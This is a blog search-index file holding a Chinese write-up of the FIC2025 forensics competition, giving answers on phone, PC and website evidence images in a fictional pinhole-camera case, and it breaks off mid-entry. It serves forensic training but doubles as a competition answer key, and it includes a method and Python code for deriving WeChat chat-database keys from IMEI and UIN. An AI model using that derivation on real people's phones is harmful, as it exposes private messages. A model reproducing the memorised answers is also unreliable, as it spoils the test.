<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>links</title>
      <link href="/2025/05/03/links/"/>
      <url>/2025/05/03/links/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>FIC2025 wp</title>
      <link href="/2025/05/01/FIC2025-wp/"/>
      <url>/2025/05/01/FIC2025-wp/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">检材密码：3x@9Qm!V8e$vL%6d^Yr5o*C#Nk7h&amp;ZpFbW2sG4jXuD1cO0lTgAqHwRnIzJyM-_+K=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网络黑灰产往往结伴而生，大量黑灰产内容错综复杂。随着ai和互联网技术的发展黑灰产形式也越来越多样。离线的孤</span><br><span class="line">军奋战已不再能解放生产力。</span><br><span class="line"> 这次fic我们将通过黑灰产边缘人物李安弘的视角找到黑产们的老巢。近期经匿名人员举报在某购物平台有店铺销售针</span><br><span class="line">孔摄像头，警方通过调取购物平台后台权限后对订单内容进行固定获得（检材1.rar）。经过一段时间的追查最终在店铺老</span><br><span class="line">板家中抓获老板李某（李安弘），缴获李某手机(检材2.tar)，电脑(检材3.E01)和大量摄像头。通过李某电子证据最终追查到</span><br><span class="line">该灰产上游人员陈某。</span><br></pre></td></tr></table></figure><h2 id="网站快照部分"><a href="#网站快照部分" class="headerlink" title="网站快照部分"></a>网站快照部分</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“老赵商城系统”并非公开推广的普通电商平台，而是一个仅限内部使用、受邀注册的封闭系统。李某利用这套系统，建立起一条以代理人和渠道商为主导的销售链条，将他定制、经过特殊改装的针孔摄像头销售给经过严格筛选的代理成员。</span><br></pre></td></tr></table></figure><h3 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h3><blockquote><p> 请分析检材一，该取证录像文件的 SHA256 值为</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -hashfile 取证录像.mp4 SHA256</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430194834355.png" alt="image-20250430194834355"></p><h3 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h3><blockquote><p>请分析检材一，远程取证所使用的 OBS 工具版本号为</p></blockquote><p>看看取证录像.mp4</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430195221871.png" alt="image-20250430195221871"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">29.1.3</span><br></pre></td></tr></table></figure><h3 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h3><blockquote><p>请分析检材一，该检材所使用的远程取证的工具名称为</p><p>A. 网镜</p><p>B. 快照大师</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430195358871.png" alt="image-20250430195358871"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure><h3 id="T4"><a href="#T4" class="headerlink" title="T4"></a>T4</h3><blockquote><p>请分析检材一，在该检材中，远程取证过程中校验的北京时间为</p><p>A.2025&#x2F;4&#x2F;9 13:33:18</p><p>B.2025&#x2F;4&#x2F;9 13:34:18</p><p>C.2025&#x2F;4&#x2F;9 13:35:18</p><p>D.2025&#x2F;4&#x2F;9 13:36:18</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430195918737.png" alt="image-20250430195918737"></p><p>时间挑个最近的好了。</p><h3 id="T5"><a href="#T5" class="headerlink" title="T5"></a>T5</h3><blockquote><p>请分析检材一，远程取证的网站 IP 地址为 </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430200049643.png" alt="image-20250430200049643"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.10.200</span><br></pre></td></tr></table></figure><h3 id="T6"><a href="#T6" class="headerlink" title="T6"></a>T6</h3><blockquote><p>请分析检材一，在该检材中，远程取证的网站密码为</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430200140724.png" alt="image-20250430200140724"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin123</span><br></pre></td></tr></table></figure><h3 id="T7"><a href="#T7" class="headerlink" title="T7"></a>T7</h3><blockquote><p>请分析检材一，在已固定的“订单列表”中发现有一页缺失。请找出缺失页面的具体页码为</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430200641269.png" alt="image-20250430200641269"></p><p>很容易发现缺失的页数是200页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">200</span><br></pre></td></tr></table></figure><h3 id="T8"><a href="#T8" class="headerlink" title="T8"></a>T8</h3><blockquote><p>请分析检材一，补充“订单列表”中缺失页面的数据后，统计订单的总数为</p></blockquote><p>后面是ocr相关的了，懒得复现。我们直接看后面的。</p><h2 id="手机部分"><a href="#手机部分" class="headerlink" title="手机部分"></a>手机部分</h2><h3 id="T1-1"><a href="#T1-1" class="headerlink" title="T1"></a>T1</h3><blockquote><p><strong>1. 请分析检材二，请分析”手机”检材，并回答，并回答该手机的device_name是？</strong></p></blockquote><p>爆搜获取device_name</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426161922281.png" alt="image-20250426161922281"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426161905523.png" alt="image-20250426161905523"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redmi 6 Pro</span><br></pre></td></tr></table></figure><h3 id="T2-1"><a href="#T2-1" class="headerlink" title="T2"></a>T2</h3><blockquote><p><strong>2. 请分析检材二，请分析”手机”检材，并回答，嫌疑人pc开机密码是什么？</strong></p></blockquote><p>爆搜“接头暗号”的时候发现pc开机密码</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426162016698.png" alt="image-20250426162016698"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426162037990.png" alt="image-20250426162037990"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1qaz2wsx</span><br></pre></td></tr></table></figure><h3 id="T3-1"><a href="#T3-1" class="headerlink" title="T3"></a>T3</h3><blockquote><p><strong>3. 请分析检材二，请分析”手机”检材，并回答，嫌疑人接头暗号是什么？</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;note&quot;:[&#123;&quot;format&quot;:&quot;HEADING&quot;,&quot;text&quot;:&quot;接头暗号&quot;&#125;,&#123;&quot;format&quot;:&quot;IMAGE&quot;,&quot;text&quot;:&quot;ub690t1mq9kelnah.png&quot;&#125;,&#123;&quot;format&quot;:&quot;CHECKLIST_UNCHECKED&quot;,&quot;text&quot;:&quot;说上述暗号&quot;&#125;,&#123;&quot;format&quot;:&quot;CHECKLIST_CHECKED&quot;,&quot;text&quot;:&quot;地点：香格里拉大酒店大堂&quot;&#125;,&#123;&quot;format&quot;:&quot;CHECKLIST_CHECKED&quot;,&quot;text&quot;:&quot;黑皮鞋&quot;&#125;,&#123;&quot;format&quot;:&quot;CHECKLIST_CHECKED&quot;,&quot;text&quot;:&quot;系领带&quot;&#125;,&#123;&quot;format&quot;:&quot;CHECKLIST_CHECKED&quot;,&quot;text&quot;:&quot;穿西装&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure><p>发现存在一个png,<code>ub690t1mq9kelnah.png</code></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426162452998.png" alt="image-20250426162452998"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">爱能不能够永远单纯没有悲哀 </span><br></pre></td></tr></table></figure><h3 id="T4-1"><a href="#T4-1" class="headerlink" title="T4"></a>T4</h3><blockquote><p><strong>4. 请分析检材二，请分析”手机”检材，并回答，嫌疑人存放的秘钥环是多少？</strong></p></blockquote><p>爆搜！！</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426163224010.png" alt="image-20250426163224010"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426163119007.png" alt="image-20250426163119007"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250426163051768.png" alt="image-20250426163051768"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1qaz2wsx3edc</span><br></pre></td></tr></table></figure><h3 id="T5-1"><a href="#T5-1" class="headerlink" title="T5"></a>T5</h3><blockquote><p><strong>5. 请分析检材二，请分析”手机”检材，并回答，嫌疑人一生中最重要的日子是什么时候？</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426163252769.png" alt="image-20250426163252769"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426163303072.png" alt="image-20250426163303072"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2026.2.26</span><br></pre></td></tr></table></figure><h3 id="T6-1"><a href="#T6-1" class="headerlink" title="T6"></a>T6</h3><blockquote><p><strong>6. 请分析检材三，请分析”手机”检材，并回答，嫌疑人微信生成的聊天记录数据库文件名称是什么？</strong></p></blockquote><p>对微信的聊天记录进行跳转到源文件，发现都是以下db文件</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426163359844.png" alt="image-20250426163359844"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EnMicroMsg.db</span><br></pre></td></tr></table></figure><h3 id="T7-1"><a href="#T7-1" class="headerlink" title="T7"></a>T7</h3><blockquote><p><strong>7. 请分析检材二，请分析”手机”检材，并回答，嫌疑人微信账号对应的 UIN 为多少？</strong></p></blockquote><p>问一下AI，然后找到文件所在位置</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426163455660.png" alt="image-20250426163455660"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1864810197</span><br></pre></td></tr></table></figure><h3 id="T8-1"><a href="#T8-1" class="headerlink" title="T8"></a>T8</h3><blockquote><p>请分析检材二，请分析”手机”检材，并回答，嫌疑人微信聊天记录数据库的加密秘钥是什么？ </p></blockquote><p>在手机取证中，<strong>微信聊天记录数据库的加密密钥</strong>（针对Android的<code>EnMicroMsg.db</code>）是通过特定规则生成的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key = MD5(IMEI + UIN)[:7]  # 取MD5哈希的前7位字符</span><br></pre></td></tr></table></figure><ul><li><strong>IMEI</strong>：手机设备的IMEI号（15位数字）。</li><li><strong>UIN</strong>：微信用户唯一标识（10位数字，从<code>auth_info_key_prefs.xml</code>中提取）。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426174937704.png" alt="image-20250426174937704"></p><p>这里的uin在auth_info_key_prefs.xml和system_config_prefs.xml中都有，但是值是一样的，所以我们不必太过纠结。</p><p>至于imei，火眼直接分析到了。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430203920733.png" alt="image-20250430203920733"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">imei = <span class="string">&quot;868139033433456&quot;</span></span><br><span class="line">uin = <span class="string">&quot;1864810197&quot;</span></span><br><span class="line">key = hashlib.md5((imei + uin).encode()).hexdigest()[:<span class="number">7</span>]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426175509711.png" alt="image-20250426175509711"></p><h3 id="T9"><a href="#T9" class="headerlink" title="T9"></a>T9</h3><blockquote><p><strong>9. 请分析检材二，请分析”手机”检材，并回答，嫌疑人“欠条.rar”的解压密码是多少？</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426165337419.png" alt="image-20250426165337419"></p><p>解压密码是手机号码，那就肯定藏在这个图片里，我们找一下源文件。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426165427540.png" alt="image-20250426165427540"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426165438701.png" alt="image-20250426165438701"></p><p>发现有四张，dump下来。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426165524297.png" alt="image-20250426165524297"></p><p>发现二维码，扫一下获得手机号！</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426165552274.png" alt="image-20250426165552274"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3170010703</span><br></pre></td></tr></table></figure><h3 id="T10"><a href="#T10" class="headerlink" title="T10"></a>T10</h3><blockquote><p><strong>10. 请分析检材二，请分析”手机”检材，并回答，嫌疑人“欠条.rar”解压后，其中VeraCrypt容器的MD5值是多少？</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426165759621.png" alt="image-20250426165759621"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">83da62aabc88cb1b23e9469142b67b80</span><br></pre></td></tr></table></figure><h3 id="T11"><a href="#T11" class="headerlink" title="T11"></a>T11</h3><blockquote><p><strong>11. 请分析检材二，请分析”手机”检材，并回答，嫌疑人提供的“欠条.rar”解压后，其中”1.png”图上显示的VeraCrypt容器密码是多少？</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426165829135.png" alt="image-20250426165829135"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!@KE2sax@!da0h5hghg34&amp;@</span><br></pre></td></tr></table></figure><h3 id="T12"><a href="#T12" class="headerlink" title="T12"></a>T12</h3><blockquote><p><strong>12. 请分析检材二，请分析”手机”检材，并回答，嫌疑人李某全名是什么？</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430204011733.png" alt="image-20250430204011733"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">李安弘</span><br></pre></td></tr></table></figure><h3 id="T13"><a href="#T13" class="headerlink" title="T13"></a>T13</h3><blockquote><p><strong>13. 请分析检材二，请分析”手机”检材，并回答，嫌疑人欠款金额是多少？</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80000</span><br></pre></td></tr></table></figure><h2 id="计算机部分"><a href="#计算机部分" class="headerlink" title="计算机部分"></a>计算机部分</h2><h3 id="T1-2"><a href="#T1-2" class="headerlink" title="T1"></a>T1</h3><blockquote><p>请分析检材三，请分析”电脑”检材，并回答，该电脑最后一次开机时间是？</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430203748271.png" alt="image-20250430203748271"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025-04-14 11:49:47</span><br></pre></td></tr></table></figure><h3 id="T2-2"><a href="#T2-2" class="headerlink" title="T2"></a>T2</h3><blockquote><p>请分析检材三，请分析”电脑”检材，并回答，嫌疑人的备用机号码是多少？ </p></blockquote><p>在火眼分析中看到了一部分电话号码，但这样填进去肯定是不行的，因为是不完整的。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430204359157.png" alt="image-20250430204359157"></p><p>我们仿真一下。打开便签看看。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430205252618.png" alt="image-20250430205252618"></p><p>原本是不可见的，当我们全选后发现出现了备用机号码！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18877332134</span><br></pre></td></tr></table></figure><h3 id="T3-2"><a href="#T3-2" class="headerlink" title="T3"></a>T3</h3><blockquote><p>请分析检材三，请分析”电脑”检材，并回答，域名dgy02.com曾保存过一个密码，该密码是多少？ </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430205526276.png" alt="image-20250430205526276"></p><p>火眼分析不出来。。仿真看看，已知是在谷歌浏览器。发现打开谷歌需要秘钥环，这我们在手机部分已经获得了！</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430205622952.png" alt="image-20250430205622952"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1qaz2wsx3edc</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430205750028.png" alt="image-20250430205750028"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcgg123456</span><br></pre></td></tr></table></figure><h3 id="T4-2"><a href="#T4-2" class="headerlink" title="T4"></a>T4</h3><blockquote><p>请分析检材三，请分析”电脑”检材，并回答，其电脑安装的微信版本是多少？</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430205952000.png" alt="image-20250430205952000"></p><p>可以得知是4.0.0.21</p><p>我们也可以通过命令行的方法来获取</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430210103772.png" alt="image-20250430210103772"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.0.0.21</span><br></pre></td></tr></table></figure><h3 id="T5-2"><a href="#T5-2" class="headerlink" title="T5"></a>T5</h3><blockquote><p>请分析检材三，请分析”电脑”检材，并回答，该系统有哪些远程控制软件</p><p>A.todesk B.向日葵 C.爱思远控 D.raylink</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430210224843.png" alt="image-20250430210224843"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430210216513.png" alt="image-20250430210216513"></p><p>其他两个我们搜不到，所以下载了todesk和向日葵</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AB</span><br></pre></td></tr></table></figure><h3 id="T6-2"><a href="#T6-2" class="headerlink" title="T6"></a>T6</h3><blockquote><p>请分析检材三，请分析”电脑”检材，并回答，电脑2025年4月10日11点4分29秒曾被向日葵远程控制，其记录的日志文件名为</p></blockquote><p>当我们打开向日葵后，发现如下设置</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430210440576.png" alt="image-20250430210440576"></p><p>那么我们就来这里看一下。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250430210513756.png" alt="image-20250430210513756"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430210743974.png" alt="image-20250430210743974"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sunlogin_service.log.2</span><br></pre></td></tr></table></figure><h3 id="T7-2"><a href="#T7-2" class="headerlink" title="T7"></a>T7</h3><blockquote><p>请分析检材三，请分析”电脑”检材，并回答，电脑2025年4月10日11点4分29秒曾被向日葵远程控制，日志内记录对方公网IP地址和端口为</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">116.192.161.222:2577</span><br></pre></td></tr></table></figure><h3 id="T8-2"><a href="#T8-2" class="headerlink" title="T8"></a>T8</h3><blockquote><p>请分析检材三，请分析”电脑”检材，并回答，某文件的MD5值为“2bdfcdbd6c63efc094ac154a28968b7d”，该文件名为 </p></blockquote><p>我们发现用户痕迹中有一个文件比较可疑，内容是关于助记词的，我们尝试对其计算哈希值，发现md5值对应</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430211441082.png" alt="image-20250430211441082"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">important.docx</span><br></pre></td></tr></table></figure><h3 id="T9-1"><a href="#T9-1" class="headerlink" title="T9"></a>T9</h3><blockquote><p>请分析检材三，请分析”电脑”检材，据调查，上述文件存放了钱包助记词，第一个单词是什么？</p></blockquote><p>我们尝试导出这个important.docx</p><p>由于docx里什么都没有显示，docx是压缩格式的，我们将后缀改成zip后解压。</p><p>我们将解压后的文件夹放火眼里分析一下：</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430212853414.png" alt="image-20250430212853414"></p><p>发现important.xml有猫腻！是一个jpg文件！</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430212915225.png" alt="image-20250430212915225"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solution</span><br></pre></td></tr></table></figure><h3 id="T10-1"><a href="#T10-1" class="headerlink" title="T10"></a>T10</h3><blockquote><p>请分析检材三（“我的测试机”），最近曾访问过的音频文件，该音频文件的文件名是什么</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430222315395.png" alt="image-20250430222315395"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自传小说.MP3</span><br></pre></td></tr></table></figure><h3 id="T11-1"><a href="#T11-1" class="headerlink" title="T11"></a>T11</h3><blockquote><p>请分析检材三（“我的测试机”），最近曾使用过USB设备，该设备的名称为</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250430222418520.png" alt="image-20250430222418520"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">256GB thinkplus</span><br></pre></td></tr></table></figure><h3 id="T12-1"><a href="#T12-1" class="headerlink" title="T12"></a>T12</h3><blockquote><p>请分析检材三（“我的测试机”）中的音频内容，并回答，嫌疑人现任妻子毕业的大学是？ </p></blockquote><p>我们仿真一下，然后把音乐拖出来听听。</p><p>发现音乐长达两个小时，我们用Audacity把它截掉，时间缩短到30分钟以下，然后我们就可以用一些网站来分析转文字了。</p><p><a href="https://itingnao.com/">https://itingnao.com/</a></p><p>注意是现任妻子，不是上海大学！</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501003416767.png" alt="image-20250501003416767"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">北京大学</span><br></pre></td></tr></table></figure><h3 id="T13-1"><a href="#T13-1" class="headerlink" title="T13"></a>T13</h3><blockquote><p>请分析检材三（“我的测试机”）中的音频内容，并回答，嫌疑人是通过一个朋友认识的陈老板，该朋友姓氏拼音是？ </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501003507626.png" alt="image-20250501003507626"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wang</span><br></pre></td></tr></table></figure><h3 id="T14"><a href="#T14" class="headerlink" title="T14"></a>T14</h3><blockquote><p>请分析检材三（“我的测试机”）中的音频内容，并回答，嫌疑人所说的香格里拉大酒店实则是？</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501003606649.png" alt="image-20250501003606649"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">后院棋牌室</span><br></pre></td></tr></table></figure><h3 id="T15"><a href="#T15" class="headerlink" title="T15"></a>T15</h3><blockquote><p>请分析检材三（“我的测试机”）中的音频内容，并回答，嫌疑人银行密码是多少？</p></blockquote><p>这题有点抽象，把每段音频的开头一个拼接如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我得银然行那随每马事平令起一随就随然随</span><br></pre></td></tr></table></figure><p>大致可以翻译成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我的银 _ 行 _ _ 密码是07145924</span><br></pre></td></tr></table></figure><p>也不确定对不对，抽象题就这样吧，满逆天的，没有什么可做性。</p><h2 id="互联网取证"><a href="#互联网取证" class="headerlink" title="互联网取证"></a>互联网取证</h2><h3 id="T1-3"><a href="#T1-3" class="headerlink" title="T1"></a>T1</h3><blockquote><p>请分析检材二，找到李某上游人员陈某博客宣传所用域名为</p></blockquote><p>手机部分可以获取到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chen.foren6</span><br></pre></td></tr></table></figure><h3 id="T2-3"><a href="#T2-3" class="headerlink" title="T2"></a>T2</h3><blockquote><p>请分析陈某宣传所用域名，该域名的顶级域名在以下那个区块链注册</p><p><strong>A. ETH（<a href="https://ens.domains/%EF%BC%89">https://ens.domains/）</a></strong></p><p><strong>B. HNS（<a href="https://handshake.org/%EF%BC%89">https://handshake.org/）</a></strong></p><p><strong>C. BTC（<a href="https://bitcoin.org/%EF%BC%89">https://bitcoin.org/）</a></strong></p><p><strong>D. Namecoin（<a href="https://www.namecoin.org/%EF%BC%89">https://www.namecoin.org/）</a></strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501004408813.png" alt="image-20250501004408813"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><h3 id="T3-3"><a href="#T3-3" class="headerlink" title="T3"></a>T3</h3><blockquote><p>请分析陈某宣传所用域名的顶级域名的域名解析服务器（DNS）共有几个 </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501004738912.png" alt="image-20250501004738912"></p><p>有两个</p><p>也可以用dig的方法，但是注意这里要使用这个链路的，如果直接dig是不行的。</p><p>使用<a href="https://www.hdns.io/">HDNS - Handshake DNS</a>中的DNS服务器解析域名</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501012511876.png" alt="image-20250501012511876"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501012446410.png" alt="image-20250501012446410"></p><h3 id="T4-3"><a href="#T4-3" class="headerlink" title="T4"></a>T4</h3><blockquote><p>请分析陈某宣传所用域名的顶级域名的NS1服务器ip为</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501005219356.png" alt="image-20250501005219356"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">45.79.133.98</span><br></pre></td></tr></table></figure><h3 id="T5-3"><a href="#T5-3" class="headerlink" title="T5"></a>T5</h3><blockquote><p>请分析陈某宣传所用域名，该域名DNS记录指向邮件服务器域名为</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501012608427.png" alt="image-20250501012608427"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail.163.com</span><br></pre></td></tr></table></figure><h3 id="T6-3"><a href="#T6-3" class="headerlink" title="T6"></a>T6</h3><blockquote><p>请分析陈某宣传所用域名，该域名的txt记录中chen的值为 </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501012640973.png" alt="image-20250501012640973"></p><figure class="highlight 